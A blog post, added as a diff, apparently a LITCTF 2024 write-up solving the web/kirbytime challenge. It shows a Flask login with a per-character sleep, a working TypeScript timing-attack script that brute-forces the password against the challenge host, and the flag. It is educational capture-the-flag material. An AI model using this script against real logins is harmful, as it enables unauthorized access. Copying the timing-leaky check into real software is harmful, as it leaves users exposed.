@@ -1,0 +1,124 @@
+---
+pubDatetime: 2024-08-14T00:00:00.000Z
+title: "LITCTF 2024 Writeup: Harder Web (4/5)"
+postSlug: litctf24-harder-web
+featured: false
+draft: false
+tags:
+  - ctf
+  - litctf
+  - litctf24
+  - web
+  - rev
+description: Writeup of 3 interesting web and rev challenges from LITCTF24
+---
+
+import Alert, { DefaultAlertTypes } from "@components/Alert.astro";
+
+This post is part 4 of 5 for LITCTF24.
+
+1. [4 basic web challenges](/2024/08/14/litctf24-web)
+2. [3 basic crypto (+1 misc) challenges](/2024/08/14/litctf24-crypto)
+3. [3 basic rev challenges](/2024/08/14/litctf24-rev)
+4. _web/kirbytime, web/scrainbow, rev/revsite1_
+5. [4 fun pwn challenges](/2024/08/14/litctf24-pwn)
+
+## Table of contents
+
+## web/kirbytime
+
+_218 solves / 125 points_
+
+> Welcome to Kirby's Website.
+
+After starting an instance we get a simple login page, we can see Kirby has made a reappearance after [last year's Kirbbot challenge](https://roylau98.github.io/writeups/litctf2023#kirbbot-has-a-secret).
+![challenge page, showing a password field and a login button, with a kirby background](https://i.sportshead.dev/fbt8416.png)
+
+<Alert type={DefaultAlertTypes.note}>
+  This screenshot shows the login page which wanted a 20 character password. However the challenge was changed to only require 7 to be guessed due to high amounts of lag. I restarted my attempt after the challenge was modified due to the infrastructure being unstable during my inital attempt. 
+</Alert>
+
+This time Kirby would like us to enter a password. We can take a look at the attached zip:
+
+```py=
+import sqlite3
+from flask import Flask, request, redirect, render_template
+import time
+app = Flask(__name__)
+
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    message = None
+    if request.method == 'POST':
+        password = request.form['password']
+        real = 'REDACTED'
+        if len(password) != 7:
+            return render_template('login.html', message="you need 7 chars")
+        for i in range(len(password)):
+            if password[i] != real[i]:
+                message = "incorrect"
+                return render_template('login.html', message=message)
+            else:
+                time.sleep(1)
+        if password == real:
+            message = "yayy! hi kirby"
+
+    return render_template('login.html', message=message)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+```
+
+We can see that the script checks each character of the password and sleeps 1 second for every correct character. Using this information we can execute a timing attack:
+
+```typescript=
+const url = "http://34.31.154.223:58701";
+
+let guess = "";
+
+const regex = /<p>(.*)<\/p>\s*<\/div>/;
+async function getTime(pass): number {
+    const now = Date.now();
+
+    const res = await fetch(url, {
+        method: "POST",
+        body: `password=${pass.padEnd(7, "*")}`,
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    });
+
+    const end = Date.now();
+    const t = await res.text();
+    console.log(pass, end - now, t.match(regex)[1]);
+
+    return end - now;
+}
+
+let baseline = 0;
+for (let i = 0; i < 10; i++) {
+    baseline += await getTime("");
+}
+
+baseline /= 10;
+console.log("avg", baseline);
+baseline += 900;
+
+const letters = [..."abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"];
+
+while (guess.length < 7) {
+    for (const l of letters) {
+        const t = await getTime(guess + l);
+        if (t > baseline) {
+            guess += l;
+            baseline += 900;
+            break;
+        }
+    }
+}
+
+console.log(guess);
+```
+
+Unfortunately my instance closed before the script finished running, but I had got to `kBySlac`. A quick bit of guessing the last character leads to the flag `LITCTF{kBySlaY}`.
